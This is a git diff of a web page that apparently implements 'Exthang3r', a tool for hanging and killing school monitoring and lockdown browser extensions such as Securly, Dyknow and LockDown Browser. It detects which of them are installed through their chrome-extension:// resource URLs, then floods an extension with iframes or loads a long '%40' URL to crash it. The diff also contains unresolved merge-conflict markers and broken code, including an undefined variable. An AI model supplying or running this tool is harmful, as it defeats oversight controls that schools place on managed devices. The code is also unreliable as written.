@@ -229,25 +229,6 @@
             button:hover {
                 transform: scale(1.1);
             }
-
-            #overlay {
-                display: none;
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                justify-content: center;
-                align-items: center;
-                color: white;
-                backdrop-filter: blur(40px);
-                font-size: 1.5em;
-                font-family: "Avenir", Helvetica, sans-serif;
-            }
-
-            .hidden {
-                display: none;
-            }
         </style>
 
     </head>
@@ -280,21 +261,15 @@
 
             <div class="header">
 
-                <select id="iframeSelect"></select>
+                <select id="extensionSelect"></select>
 
                 <br>
 
                 <br>
 
-                <input type="range" id="slider" class="slider" min="0" max="1000">
+                <input type="range" id="extSlider" class="slider" min="0" max="1000">
 
                 <button id="hangButton" class="submit">Hang</button>
-
-                <button id="killButton" class="hidden submit">Kill Extension</button>
-
-                <p id="killExtensionText" class="hidden"></p>
-
-                <div id="overlay">Hanging extension...</div>
 
             </div>
 
@@ -373,7 +348,14 @@
                 window.open(newUrl, "_blank")
             }
 
+            function hang() {
+            const url = document.getElementById("extensionSelect").value;
+            const ext = window.open(url);
+            const slider = document.getElementById("extSlider").value;
+            const extManage = url.split("/").slice(0, 3).join("/") + "/";
+            window.open(extManage, "_blank");
 
+<<<<<<< Updated upstream
             /* Exthang3r modified a bit, Origional by BlobbyBoi*/
 
         document.addEventListener("DOMContentLoaded", () => {
@@ -387,18 +369,37 @@
 
         populateSelectOptions();
         });
+=======
+            setTimeout(() => {
+                let killURL = "https://" + "%40".repeat(slider);
+                ext.location.href = killURL;
+                let iframe = document.createElement("iframe");
+                iframe.src = extURL;
+            	iframe.style.width = "10px";
+            	iframe.style.height = "10px";
+            	iframe.style.border = "none";
+            	document.body.appendChild(iframe);
+                setTimeout(() => {
+		    ext.close()
+            	}, 1000);
+            }, 100);
+        }
+>>>>>>> Stashed changes
 
         async function checkExtensionURL(url) {
-        try {
-            const response = await fetch(url);
-            return response.ok;
-        } catch (error) {
-            return false;
+            try {
+                const response = await fetch(url);
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
         }
-        }
+        document.addEventListener("DOMContentLoaded", async () => {
+        await populateSelectOptions();
+    });
 
-        async function populateSelectOptions() {
-        const selectElement = document.getElementById("iframeSelect");
+    async function populateSelectOptions() {
+        const selectElement = document.getElementById("extensionSelect");
         const extensions = {
             "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
             "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
@@ -434,92 +435,35 @@
             "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
             "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png",
             "Dyknow": "chrome-extension://kmpjlilnemjciohjckjadmgmicoldglf/ui/views/options.html",
-
         };
 
-        const extensionChecks = Object.entries(extensions).map(async ([name, url]) => {
-            if (await checkExtensionURL(url)) {
-            const option = document.createElement("option");
-            option.value = url;
-            option.textContent = name;
-            selectElement.appendChild(option);
-            return true;
-            }
-            return false;
-        });
+        let hasSupportedExtensions = false;
 
-        const results = await Promise.all(extensionChecks);
-        if (!results.some(result => result)) {
+        for (const [name, url] of Object.entries(extensions)) {
+            try {
+                if (!await checkExtensionURL(url)) {
+                    hasSupportedExtensions = false;
+                    throw new error();
+                }
+                const option = document.createElement("option");
+                option.value = url;
+                option.textContent = name;
+                selectElement.appendChild(option);
+                hasSupportedExtensions = true;
+            } catch (error) {
+                console.error(`Error adding extension: ${name}`, error);
+            }
+        }
+
+        if (!hasSupportedExtensions) {
             const option = document.createElement("option");
             option.value = "";
             option.textContent = "No supported extensions installed";
             selectElement.appendChild(option);
             document.getElementById("hangButton").classList.add("hidden");
-            document.getElementById("slider").classList.add("hidden");
+            document.getElementById("extSlider").classList.add("hidden");
         }
-        }
-
-        function replaceIframes(container, iframeSrc, iframeCount) {
-        const createIframes = () => {
-            const fragment = document.createDocumentFragment();
-            for (let i = 0; i < iframeCount; i++) {
-            const iframe = document.createElement('iframe');
-            iframe.src = iframeSrc;
-            iframe.style.width = '100%';
-            iframe.style.height = '100px';
-            fragment.appendChild(iframe);
-            }
-            container.appendChild(fragment);
-        };
-
-        createIframes();
-        setInterval(() => {
-            container.innerHTML = '';
-            createIframes();
-        }, 5);
-        }
-
-        function warning() {
-        const overlay = document.getElementById("overlay");
-        overlay.style.display = "flex";
-        const iframeSelect = document.getElementById("iframeSelect");
-        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
-        const selectedSrc = iframeSelect.value;
-        const iframeCount = parseInt(document.getElementById("slider").value, 10);
-        const popup = window.open("", "PopupWindow", "width=100,height=100");
-        const popupDocument = popup.document;
-        const popupBody = popupDocument.body;
-        const iframeContainer = popupDocument.createElement('div');
-        iframeContainer.id = 'iframeContainer';
-        popupBody.appendChild(iframeContainer);
-        replaceIframes(iframeContainer, selectedSrc, iframeCount);
-        setTimeout(() => {
-            popup.close();
-            const killExtensionText = document.getElementById("killExtensionText");
-            killExtensionText.innerHTML = `<strong>${selectedOption}</strong> Press the button above to kill the extension`;
-            setTimeout(() => {
-            overlay.style.display = "none";
-            killExtensionText.classList.remove("hidden");
-            document.getElementById("killButton").classList.remove("hidden");
-            document.getElementById("hangButton").classList.add("hidden");
-            document.getElementById("iframeSelect").classList.add("hidden");
-            document.getElementById("slider").classList.add("hidden");
-            document.getElementById("killButton").setAttribute("data-url", selectedSrc);
-            }, 10000);
-        }, 5000);
-        }
-
-        function openExtensionPopup() {
-        const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
-        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
-        const killExtensionText = document.getElementById("killExtensionText");
-        document.getElementById("killButton").classList.add("hidden");
-        killExtensionText.innerHTML = `Keep this tab open. <strong>chrome://extensions/?id=${extensionId}</strong>`;
-        window.location.href = selectedSrc;
-                }
-
-        document.getElementById("hangButton").addEventListener("click", warning);
-        document.getElementById("killButton").addEventListener("click", openExtensionPopup);
+    }
         </script>
 
     </body>
